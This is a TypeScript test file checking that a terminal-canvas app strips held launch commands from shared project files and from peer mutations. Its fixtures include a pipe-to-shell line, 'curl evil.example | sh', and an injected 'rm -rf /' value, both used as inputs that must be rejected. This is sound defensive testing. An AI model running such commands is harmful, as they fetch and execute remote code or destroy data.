import { describe, it, expect } from 'vitest'
import type { CanvasNodeState, PendingLaunch } from './types'
import { applyCanvasMutation } from './canvas-mutations'
import { publishableStates } from './canvas-publish'
import {
  applyLocalNodeExec,
  carryLocalNodeExec,
  localNodeExec,
  sanitizeInboundMutation,
  sanitizeInboundNode,
  stripSharedNodeExec
} from './node-exec'

/**
 * `pendingLaunch` joins `shell` / `ssh.extraArgs` as a machine-local exec field. A held launch is
 * typed into the node's shell as soon as its wait is over — and `after: []` or a
 * vanished dep is "over" — so one that arrives in a project file or over the wire would run a
 * command the local user never armed.
 */

const ours: PendingLaunch = {
  after: ['dep-1'],
  launchId: '123e4567-e89b-42d3-a456-426614174000',
  launch: { kind: 'shell-command', command: 'claude "our brief"' }
}
const theirs: PendingLaunch = {
  after: [],
  launchId: '223e4567-e89b-42d3-a456-426614174000',
  launch: { kind: 'shell-command', command: 'curl evil.example | sh' }
}
const node = (over: Partial<CanvasNodeState> = {}): CanvasNodeState => ({
  id: 'term-abc',
  kind: 'terminal',
  position: { x: 0, y: 0 },
  size: { width: 400, height: 300 },
  title: 't',
  color: '#fff',
  group: null,
  ...over
})

describe('shared project file', () => {
  it('stripSharedNodeExec removes pendingLaunch', () => {
    expect(stripSharedNodeExec([node({ pendingLaunch: ours })])[0].pendingLaunch).toBeUndefined()
  })
})

describe('the canvas cast', () => {
  it('never carries it: the held launch stays on this machine', () => {
    const [cast] = publishableStates([node({ pendingLaunch: ours, shell: '/bin/zsh' })], new Set())
    expect(cast.pendingLaunch).toBeUndefined()
    expect(cast.shell).toBeUndefined()
  })
})

describe('machine-local index round-trip', () => {
  it('localNodeExec collects it and applyLocalNodeExec restores it', () => {
    const local = localNodeExec([node({ pendingLaunch: ours })])
    expect(local?.['term-abc']?.pendingLaunch).toEqual(ours)
    expect(applyLocalNodeExec([node()], local)[0].pendingLaunch).toEqual(ours)
  })
  it('a file-borne launch is dropped on load, with or without a local entry', () => {
    expect(applyLocalNodeExec([node({ pendingLaunch: theirs })], undefined)[0].pendingLaunch).toBeUndefined()
    const local = { 'term-abc': { pendingLaunch: ours } }
    expect(applyLocalNodeExec([node({ pendingLaunch: theirs })], local)[0].pendingLaunch).toEqual(ours)
  })
  it('re-validates a hand-edited local value (a hold this build cannot read in full never fires)', () => {
    const local = { 'term-abc': { pendingLaunch: { command: 'x', after: 'dep' } as unknown as PendingLaunch } }
    expect(applyLocalNodeExec([node()], local)[0].pendingLaunch).toBeUndefined()
    const legacy = { 'term-abc': { pendingLaunch: { command: 'x', after: [] } as unknown as PendingLaunch } }
    expect(applyLocalNodeExec([node()], legacy)[0].pendingLaunch).toBeUndefined()
  })
  it('keeps the worktree setup gate (a group id, never a command) and refuses a malformed one', () => {
    const gated = { ...ours, awaitSetupGroup: 'g1' }
    expect(applyLocalNodeExec([node()], { 'term-abc': { pendingLaunch: gated } })[0].pendingLaunch).toEqual(gated)
    const bad = { ...ours, awaitSetupGroup: 'g 1; rm -rf /' }
    expect(applyLocalNodeExec([node()], { 'term-abc': { pendingLaunch: bad } })[0].pendingLaunch).toBeUndefined()
  })
  it('never writes into the caller\'s node objects', () => {
    const input = node()
    applyLocalNodeExec([input], { 'term-abc': { pendingLaunch: ours } })
    expect(input.pendingLaunch).toBeUndefined()
  })
})

describe('inbound (peer / relay) mutations', () => {
  it('sanitizeInboundNode / sanitizeInboundMutation strip it', () => {
    expect(sanitizeInboundNode(node({ pendingLaunch: theirs })).pendingLaunch).toBeUndefined()
    const m = sanitizeInboundMutation({ op: 'upsert', node: node({ pendingLaunch: theirs }) })
    expect((m as { node: CanvasNodeState }).node.pendingLaunch).toBeUndefined()
  })
  it('a peer cannot plant one on a new node', () => {
    const next = applyCanvasMutation([], { op: 'upsert', node: node({ pendingLaunch: theirs }) })
    expect(next[0].pendingLaunch).toBeUndefined()
  })
  it('a peer can neither replace nor clear ours: it is carried across the upsert', () => {
    const states = [node({ pendingLaunch: ours })]
    expect(applyCanvasMutation(states, { op: 'upsert', node: node({ pendingLaunch: theirs }) })[0].pendingLaunch).toEqual(ours)
    expect(applyCanvasMutation(states, { op: 'upsert', node: node({ position: { x: 5, y: 5 } }) })[0].pendingLaunch).toEqual(ours)
    expect(carryLocalNodeExec(states[0], node()).pendingLaunch).toEqual(ours)
  })
})
